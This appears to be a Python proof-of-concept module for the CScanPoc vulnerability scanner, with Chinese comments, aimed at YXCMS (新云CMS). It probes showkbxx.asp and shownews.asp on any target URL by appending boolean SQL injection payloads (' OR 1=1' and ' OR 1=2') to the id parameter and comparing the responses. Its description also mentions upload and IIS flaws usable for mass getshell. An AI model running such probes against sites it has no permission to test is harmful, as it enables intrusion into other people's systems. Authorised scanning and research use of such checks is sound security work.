# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'YXcms_0004'  # 平台漏洞编号，留空
    name = '新云cms建站系统 通用SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-13'  # 漏洞公布时间
    desc = '''
        YXCMS(新云CMS)建站系统存在ewebeditor上传和iis解析漏洞，可批量getshell。
        新云cms建站系统 showkbxx.asp 页面参数过滤不完整，导致 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=090874'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YXCMS(新云CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7cd1f793-fabf-4141-972f-120c6b63b224'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-090874
            # refer:http://www.wooyun.org/bugs/wooyun-2010-090451
            hh = hackhttp.hackhttp()
            payloads = [
                '/showkbxx.asp?id=-1',
                '/shownews.asp?id=-1'
            ]
            getdata1 = '%20OR%201%3D1'
            getdata2 = '%20OR%201%3D2'
            for payload in payloads:
                code1, head, res1, errcode, _ = hh.http(
                    self.target + payload + getdata1)
                code2, head, res2, errcode, _ = hh.http(
                    self.target + payload + getdata2)
                m1 = re.findall('<div', res1)
                m2 = re.findall('<div', res2)
                if code1 == 200 and code2 == 200 and m1 != m2:
                    #security_hole(arg + payload + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
